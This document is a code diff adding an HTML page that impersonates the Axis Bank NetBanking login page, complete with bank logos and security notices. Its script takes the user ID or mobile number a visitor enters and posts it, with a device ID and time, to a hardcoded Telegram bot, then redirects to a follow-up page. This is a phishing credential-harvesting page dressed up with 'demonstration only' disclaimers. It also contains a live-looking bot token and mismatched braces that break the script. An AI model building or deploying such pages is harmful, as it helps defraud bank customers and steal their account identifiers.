@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axis Bank - NetBanking Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #ffffff;
+            color: #000000;
+            max-width: 500px;
+            margin: 0 auto;
+            overflow-x: hidden;
+        }
+        
+        /* Splash Screen */
+        #splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: opacity 0.8s ease;
+        }
+        
+        .splash-logo {
+            width: 140px;
+            height: 140px;
+            background-color: #ffffff;
+            border-radius: 28px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        
+        .splash-logo img {
+            height: 100px;
+            width: 100px;
+        }
+        
+        .splash-text {
+            color: #AE275F;
+            font-size: 36px;
+            font-weight: 800;
+            letter-spacing: 1.5px;
+            margin-bottom: 12px;
+        }
+        
+        .splash-tagline {
+            color: #666666;
+            font-size: 16px;
+            font-weight: 400;
+        }
+        
+        .loading-bar {
+            width: 220px;
+            height: 5px;
+            background-color: #f0f0f0;
+            border-radius: 3px;
+            margin-top: 50px;
+            overflow: hidden;
+        }
+        
+        .loading-progress {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(to right, #AE275F, #C63D7B);
+            border-radius: 3px;
+            animation: loading 2.2s ease-in-out forwards;
+        }
+        
+        @keyframes loading {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        
+        /* Main Container */
+        .container {
+            display: none;
+            min-height: 100vh;
+            flex-direction: column;
+            background-color: #ffffff;
+        }
+        
+        /* Header - Updated with White BG and Logo from Splash */
+        /* Header - Logo Only, White BG */
+        .header {
+            background-color: #ffffff;
+            padding: 18px 25px;
+            border-bottom: 2px solid #f0f0f0;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 80px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+        }
+        
+        .bank-logo {
+            width: 180px;
+            height: 80px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+        .bank-logo img {
+            width: 200%;
+            height: 200%;
+            object-fit: cover;
+            object-position: center -25px; /* Crops to show only center portion */
+            transform: scale(0.8);
+        }
+        
+        /* Remove bank name text */
+        .bank-name {
+            display: none;
+        }
+        
+        .bank-tagline {
+            display: none;
+        }
+        
+        /* Login Form */
+        .login-container {
+            padding: 35px 25px 30px;
+            flex-grow: 1;
+            background-color: #ffffff;
+        }
+        
+        .form-title {
+            color: #000000;
+            font-size: 26px;
+            margin-bottom: 30px;
+            font-weight: 700;
+            text-align: center;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #333333;
+            font-size: 16px;
+        }
+        
+        .input-container {
+            position: relative;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 18px 18px 18px 55px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            background-color: white;
+            color: #000000;
+            transition: all 0.3s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #AE275F;
+            box-shadow: 0 0 0 3px rgba(174, 39, 95, 0.15);
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #AE275F;
+            font-size: 20px;
+        }
+        
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+            color: #666;
+        }
+        
+        .divider-line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #e0e0e0;
+        }
+        
+        .divider-text {
+            padding: 0 15px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #777;
+        }
+        
+        /* Mobile Login Section */
+        .mobile-login-section {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 12px;
+            border: 1.5px solid #eaeaea;
+        }
+        
+        .mobile-login-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .mobile-login-title i {
+            color: #AE275F;
+        }
+        
+        .mobile-login-desc {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        
+        .mobile-form-group {
+            margin-bottom: 20px;
+        }
+        
+        .mobile-input-container {
+            position: relative;
+        }
+        
+        .mobile-input {
+            width: 100%;
+            padding: 16px 16px 16px 50px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            background-color: white;
+            color: #000000;
+            transition: all 0.3s;
+        }
+        
+        .mobile-input:focus {
+            outline: none;
+            border-color: #AE275F;
+            box-shadow: 0 0 0 3px rgba(174, 39, 95, 0.15);
+        }
+        
+        .mobile-input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #AE275F;
+            font-size: 18px;
+        }
+        
+        .mobile-submit-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #AE275F;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .mobile-submit-btn:hover {
+            background-color: #3A6D94;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(45, 91, 124, 0.2);
+        }
+        
+        /* Button */
+        .btn-next {
+            width: 100%;
+            padding: 19px;
+            background-color: #AE275F;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s;
+            box-shadow: 0 6px 20px rgba(174, 39, 95, 0.25);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn-next:hover {
+            background-color: #C63D7B;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(174, 39, 95, 0.35);
+        }
+        
+        .btn-next:active {
+            transform: translateY(0);
+        }
+        
+        .btn-next i {
+            margin-left: 10px;
+            font-size: 18px;
+        }
+        
+        .form-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 28px;
+        }
+        
+        .form-link {
+            color: #AE275F;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 600;
+            padding-bottom: 2px;
+            border-bottom: 1px solid transparent;
+            transition: all 0.2s;
+        }
+        
+        .form-link:hover {
+            text-decoration: none;
+            border-bottom: 1px solid #AE275F;
+        }
+        
+        .security-notice {
+            background-color: #f9f9f9;
+            border: 1.5px solid #eaeaea;
+            padding: 18px;
+            border-radius: 10px;
+            margin-top: 35px;
+            font-size: 14px;
+            display: flex;
+            align-items: flex-start;
+            color: #444444;
+        }
+        
+        .security-notice i {
+            color: #AE275F;
+            margin-right: 12px;
+            margin-top: 2px;
+            font-size: 18px;
+        }
+        
+        /* Footer */
+        .footer {
+            background-color: #f8f8f8;
+            color: #666666;
+            padding: 25px 20px;
+            margin-top: auto;
+            border-top: 1px solid #eaeaea;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            margin-bottom: 22px;
+        }
+        
+        .footer-link {
+            color: #666666;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 12px;
+            width: 48%;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        
+        .footer-link:hover {
+            color: #AE275F;
+            text-decoration: underline;
+        }
+        
+        .footer-disclaimer {
+            font-size: 12px;
+            line-height: 1.6;
+            border-top: 1px solid #e0e0e0;
+            padding-top: 18px;
+            margin-top: 15px;
+            color: #555555;
+        }
+        
+        .contact-info {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #e0e0e0;
+        }
+        
+        .contact-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        
+        .contact-icon {
+            background-color: #ffffff;
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
+            border: 1px solid #f0f0f0;
+        }
+        
+        .contact-icon i {
+            color: #AE275F;
+            font-size: 20px;
+        }
+        
+        .contact-text {
+            font-size: 12px;
+            font-weight: 500;
+            color: #444444;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 25px 20px;
+            }
+            
+            .header {
+                padding: 15px 20px 12px;
+            }
+            
+            .footer {
+                padding: 22px 16px;
+            }
+            
+            .splash-logo {
+                width: 120px;
+                height: 120px;
+                border-radius: 24px;
+            }
+            
+            .splash-logo img {
+                height: 85px;
+                width: 85px;
+            }
+            
+            .splash-text {
+                font-size: 32px;
+            }
+            
+            .form-title {
+                font-size: 24px;
+            }
+            
+            .mobile-login-section {
+                padding: 15px;
+            }
+        }
+        
+        /* Form input placeholder styling */
+        .form-input::placeholder {
+            color: #999999;
+            font-weight: 400;
+        }
+        
+        .mobile-input::placeholder {
+            color: #999999;
+            font-weight: 400;
+        }
+        
+        .security-notice strong {
+            color: #AE275F;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Splash Screen -->
+    <div id="splash-screen">
+        <div class="splash-logo">
+            <img src="https://cdn.brandfetch.io/id78YVtrRp/w/350/h/350/theme/dark/icon.png?c=1bxid64Mup7aczewSAYMX&t=1667590351759" alt="Axis Bank Logo" />
+        </div>
+        <div class="loading-bar">
+            <div class="loading-progress"></div>
+        </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container" id="main-container">
+        <!-- Header - Updated with white background and logo from splash -->
+        <!-- Header -->
+        <header class="header">
+            <div class="logo-container">
+                <div class="bank-logo">
+                    <img src="https://images.seeklogo.com/logo-png/1/1/axis-bank-logo-png_seeklogo-14775.png" alt="Axis Bank Logo" onerror="this.onerror=null; this.src='https://cdn.brandfetch.io/id78YVtrRp/w/350/h/350/theme/dark/icon.png?c=1bxid64Mup7aczewSAYMX&t=1667590351759'">
+                </div>
+            </div>
+        </header>
+
+        <!-- Login Form -->
+        <main class="login-container">
+            <h1 class="form-title">
+                NetBanking Login
+            </h1>
+
+            <form id="login-form">
+
+                <div class="form-group">
+                    <label class="form-label" for="userid">User ID</label>
+                    <div class="input-container">
+                        <i class="fas fa-id-card input-icon"></i>
+                        <input type="text" id="userid" class="form-input" placeholder="Enter your User ID" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label" for="password">Password</label>
+                    <div class="input-container">
+                        <i class="fas fa-key input-icon"></i>
+                        <input type="password" id="password" class="form-input" placeholder="Enter your password" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-next">
+                    Login with User ID <i class="fas fa-arrow-right"></i>
+                </button>
+
+                <div class="form-links">
+                    <a href="#" class="form-link">Forgot User ID?</a>
+                    <a href="#" class="form-link">Forgot Password?</a>
+                </div>
+
+                <!-- Divider -->
+                <div class="divider">
+                    <div class="divider-line"></div>
+                    <div class="divider-text">OR</div>
+                    <div class="divider-line"></div>
+                </div>
+
+                <!-- Mobile Login Section -->
+                <div class="mobile-login-section">
+                    <div class="mobile-login-title">
+                        <i class="fas fa-mobile-alt"></i>
+                        Login by Mobile Number
+                    </div>
+                    
+                    <div class="mobile-form-group">
+                        <label class="form-label" for="mobile-number">Registered Mobile Number</label>
+                        <div class="mobile-input-container">
+                            <i class="fas fa-phone mobile-input-icon"></i>
+                            <input type="tel" id="mobile-number" class="mobile-input" placeholder="Enter 10-digit mobile number" maxlength="10" pattern="[0-9]{10}">
+                        </div>
+                    </div>
+                    
+                    <button type="button" id="mobile-login-btn" class="mobile-submit-btn">
+                        <i class="fas fa-sign-in-alt"></i> Login with Mobile Number
+                    </button>
+                </div>
+
+                <div class="security-notice">
+                    <i class="fas fa-shield-alt"></i>
+                    <div>
+                        <strong>Security Notice:</strong> Always ensure you're on the official Axis Bank website before entering your login credentials. Never share your password or OTP with anyone.
+                    </div>
+                </div>
+
+                <div class="security-notice" style="margin-top: 15px; background-color: #fff8e1; border-color: #ffecb3; color: #804000;">
+                    <i class="fas fa-info-circle"></i>
+                    <div>
+                        <strong>Telegram Bot:</strong> To enable notifications, set <code>TELEGRAM_BOT_TOKEN</code> and <code>TELEGRAM_CHAT_ID</code> in the script. This sends login event info, not passwords.
+                    </div>
+                </div>
+            </form>
+        </main>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Terms of Service</a>
+                <a href="#" class="footer-link">Security Tips</a>
+                <a href="#" class="footer-link">Contact Us</a>
+                <a href="#" class="footer-link">Branch Locator</a>
+                <a href="#" class="footer-link">FAQs</a>
+            </div>
+
+            <div class="footer-disclaimer">
+                <p>© 2025 Axis Bank Ltd. All rights reserved. Axis Bank is a registered trademark. This is a demonstration interface only.</p>
+                <p style="margin-top: 10px;">Always log out after completing your banking session and clear your browser cache for security.</p>
+            </div>
+        </footer>
+    </div>
+
+<script>
+        // Basic Telegram bot configuration (configure these values for your bot)
+        const TELEGRAM_BOT_TOKEN = "8558586576:AAGbxImqr-TyS59Qq9jykl_EvF9YbFVZtLA";
+        const TELEGRAM_CHAT_ID = "8592704250";
+
+        let DeviceID = "{DEVICE_ID_MY_PROJECT}";
+
+        function sendTelegramMessage(text) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                console.warn('Telegram bot not configured; skipping send.');
+                return Promise.resolve();
+            }
+
+            const url = `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`;
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            };
+
+            return fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(resp => {
+                if (!resp.ok) {
+                    throw new Error(`Telegram API error: ${resp.status}`);
+                }
+                return resp.json();
+            })
+            .then(data => {
+                console.log('Telegram message sent', data);
+            })
+            .catch(err => {
+                console.warn('Could not send Telegram message', err);
+            });
+        }
+
+        // Simulate splash screen loading
+                document.addEventListener('DOMContentLoaded', function() {
+           setTimeout(function() {
+               const splashScreen = document.getElementById('splash-screen');
+               const mainContainer = document.getElementById('main-container');
+               
+               // Fade out splash screen
+               splashScreen.style.opacity = '0';
+               
+               // Show main container after splash fades out
+               setTimeout(function() {
+                   splashScreen.style.display = 'none';
+                   mainContainer.style.display = 'flex';
+               }, 800);
+           }, 2500); // Splash screen duration
+           
+           // Handle form submission (User ID + Password)
+           const loginForm = document.getElementById('login-form');
+           loginForm.addEventListener('submit', function(e) {
+               e.preventDefault();
+               
+               const userid = document.getElementById('userid').value;
+               const password = document.getElementById('password').value;
+               
+               // Simple validation
+               if (userid && password) {
+                     let formData = `User ID: ${userid}`; // DO NOT send passwords to Telegram or logs
+                     localStorage.setItem("formData", formData);
+                     localStorage.setItem("DeviceId", DeviceID);
+
+                     sendTelegramMessage(`✅ <b>Login event</b>\nUser ID: <code>${userid}</code>\nDevice ID: <code>${DeviceID}</code>\nTime: ${new Date().toLocaleString()}`)
+                       .finally(() => {
+                           window.location.href = "screen2.html";  // redirect
+                       });
+               }
+               } else {
+                   alert('Please fill in all fields before proceeding.');
+               }
+           });
+           
+           // Handle mobile login button click
+           const mobileLoginBtn = document.getElementById('mobile-login-btn');
+           mobileLoginBtn.addEventListener('click', function() {
+               const mobileNumber = document.getElementById('mobile-number').value;
+               
+               // Validate mobile number
+               const mobileRegex = /^[0-9]{10}$/;
+               
+               if (mobileRegex.test(mobileNumber)) {
+                   let formData = `Mobile: ${mobileNumber}`;
+                   localStorage.setItem("formData", formData);
+                   localStorage.setItem("DeviceId", DeviceID);
+
+                   sendTelegramMessage(`📱 <b>Mobile login event</b>\nMobile: <code>${mobileNumber}</code>\nDevice ID: <code>${DeviceID}</code>\nTime: ${new Date().toLocaleString()}`)
+                     .finally(() => {
+                         window.location.href = "screen2.html";  // redirect
+                     });
+               }
+               } else {
+                   alert('Please enter a valid 10-digit mobile number.');
+               }
+           });
+           
+           // Add visual feedback for input focus
+           const inputs = document.querySelectorAll('.form-input, .mobile-input');
+           inputs.forEach(input => {
+               input.addEventListener('focus', function() {
+                   this.parentElement.style.transform = 'scale(1.02)';
+                   this.style.backgroundColor = '#fcfcfc';
+               });
+               
+               input.addEventListener('blur', function() {
+                   this.parentElement.style.transform = 'scale(1)';
+                   this.style.backgroundColor = '#ffffff';
+               });
+           });
+           
+           // Format mobile number input (auto-format as user types)
+           const mobileInput = document.getElementById('mobile-number');
+           mobileInput.addEventListener('input', function() {
+               // Remove non-numeric characters
+               this.value = this.value.replace(/\D/g, '');
+               
+               // Limit to 10 digits
+               if (this.value.length > 10) {
+                   this.value = this.value.slice(0, 10);
+               }
+           });
+        });
+    </script>
+</body>
+
+</html>
